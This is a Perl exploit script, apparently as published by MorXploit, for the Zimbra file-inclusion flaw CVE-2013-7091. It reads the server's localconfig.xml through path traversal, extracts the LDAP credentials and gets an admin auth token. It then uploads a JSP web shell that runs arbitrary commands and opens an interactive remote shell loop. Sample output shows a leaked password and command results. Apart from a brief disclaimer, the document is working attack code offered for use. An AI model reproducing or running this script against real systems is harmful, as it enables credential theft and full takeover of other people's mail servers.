#!/usr/bin/perl
#
# Title: Zimbra file inclusion/Shell upload exploit
# CVE: 2013-7091
# Author: Simo Ben youssef
# Contact: Simo_at_Morxploit_com
# Coded: 21 February 2014
# Published: 24 February 2014
# MorXploit Research
# http://www.MorXploit.com
#
# Perl code to exploit CVE: 2013-7091
# Uploads a jsp shell when successfully exploited
#
# Requires LWP::UserAgent
# apt-get install libwww-perl
# yum install libwww-perl
# perl -MCPAN -e 'install Bundle::LWP'
# 
# Tested on Linux Ubuntu
#
# Author disclaimer:
# The information contained in this entire document is for educational, demonstration and testing purposes only.
# Author cannot be held responsible for any malicious use. Use at your own risk.
#
# Exploit usage:
# perl MorXZimbraShell.pl localhost 7071
# -------------------------------------------------------
# -- Zimbra file inclusion/Shell upload exploit
# -- Code by: Simo Ben youssef <simo_at_MorXploit_dot_com>
# -- http://www.MorXploit.com
# -------------------------------------------------------

# [+] Target set to localhost:7071
# [*] Extracting zimbra ldap password/username:
# [*] Trying to get zimbra_user
# [+] Got zimbra_user: zimbra
# [*] Trying to get zimbra_ldap_password
# [+] Got zimbra_ldap_password: lonboaxMNu
# [*] Trying to get auth token
# [+] Got auth token
# [*] Trying to upload shell ...
# [+] pwned! Shell successfully uploaded
# Linux localhost 3.2.0-29-generic #46-Ubuntu SMP Fri Jul 27 17:03:23 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
# uid=1001(zimbra) gid=1001(zimbra) groups=1001(zimbra),0(root)

use strict;
use LWP::UserAgent;

sub banner {
system('clear');
print "-------------------------------------------------------\n";
print "-- Zimbra file inclusion/Shell upload exploit\n";
print "-- Code by: Simo Ben youssef <simo_at_MorXploit_dot_com>\n";
print "-- http://www.MorXploit.com\n";
print "-------------------------------------------------------\n\n";
}

if (!defined ($ARGV[0] && $ARGV[1])) {
banner();
print "Usage: perl $0 host port\n";
print "Exp: perl $0 localhost 7071\n";
exit;
}
my $host = $ARGV[0];
my $port = $ARGV[1];
my $soappath = "service/admin/soap";
my $upload = "service/extension/clientUploader/upload/";
my $shellname = "morx.jsp";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $can_accept = HTTP::Message::decodable;
my $response = $ua->get("https://$host:$port/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00", 
    'Accept-Encoding' => $can_accept,
);

sub pwn {
print "[*] Trying to get $_[0]\n";
if ($response->decoded_content =~ /$_[0](.*?)<\/value>/s){
$1 =~ /a\["<value>(.*)/s;
print "[+] Got $_[0]: $1\n";
return $1;
}
else
{
print "[-] Failed to get $_[0]! Probably not vulnerable\n";
exit;
}
}
system('clear');
banner();
print "[+] Target set to $host:$port\n";
print "[*] Extracting zimbra ldap password/username:\n";
my $ldap_user = pwn("zimbra_user");
my $ldap_pass = pwn("zimbra_ldap_password");

print "[*] Trying to get auth token\n";
my $message = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<env:Envelope xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:ns1=\"urn:zimbraAdmin\" xmlns:ns2=\"urn:zimbraAdmin\"><env:Header><ns2:context/></env:Header><env:Body><ns1:AuthRequest><account by=\"name\">$ldap_user</account><password>$ldap_pass</password></ns1:AuthRequest></env:Body></env:Envelope>";
my $userAgent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $request = HTTP::Request->new(POST => "https://$host:$port/$soappath");
$request->header(SOAPAction => 'urn:zimbraAdmin#AuthRequest');
$request->content($message);
$request->content_type('application/soap+xml; charset=utf-8');
my $response = $userAgent->request($request);
my $authtoken;
if ($response->content =~ /<authToken>(.*?)<\/authToken>/s){
$authtoken = $1;
print "[+] Got auth token\n";
}
else
{
print "[-] Failed to get auth token\n";
exit;
}

print "[*] Trying to upload shell ...\n";
$ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $resp = $ua->post("https://$host:$port/$upload", 
Content_Type => 'form-data',
Cookie => "ZM_ADMIN_AUTH_TOKEN=$authtoken",
Content => [
clientFile => [ undef, "$shellname",
Content_Type => 'application/octet-stream',
Content => "<%@ page import=\"java.util.*,java.io.*\"%>
<%
if (request.getParameter(\"cmd\") != null) {
String cmd = request.getParameter(\"cmd\");
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>",
      ],
      submit => 'requestId',
   ],
);

if ($resp->as_string =~ /200 OK/) {
print "[+] pwned! Shell successfully uploaded\n";
}
else {
print "[-] Couldn't upload shell although host is vulnerable, most likely cuz clientUploader extention was not found\n";
print "[*] wget http://www.morxploit.com/morxploits/morxzimbra.pl to create a new admin account, have fun!\n";
#print $resp->as_string; # uncomment to print server's response
exit;
}

my $whoami = $ua->get("https://$host:$port/downloads/$shellname?cmd=whoami");
my $uname = $ua->get("https://$host:$port/downloads/$shellname?cmd=uname%20-n");
my $id = $ua->get("https://$host:$port/downloads/$shellname?cmd=id");
my $unamea = $ua->get("https://$host:$port/downloads/$shellname?cmd=uname%20-a");
print $unamea->content; 
print $id->content;
my $wa = $whoami->content;
my $un = $uname->content;
chomp($wa);
chomp($un);

while () {
print "\n$wa\@$un:~\$ ";
chomp(my $cmd=<STDIN>);
if ($cmd eq "exit") 
{ 
print "Aurevoir!\n";
exit;
}
my $output = $ua->get("https://$host:$port/downloads/$shellname?cmd=$cmd");
print $output->content;
}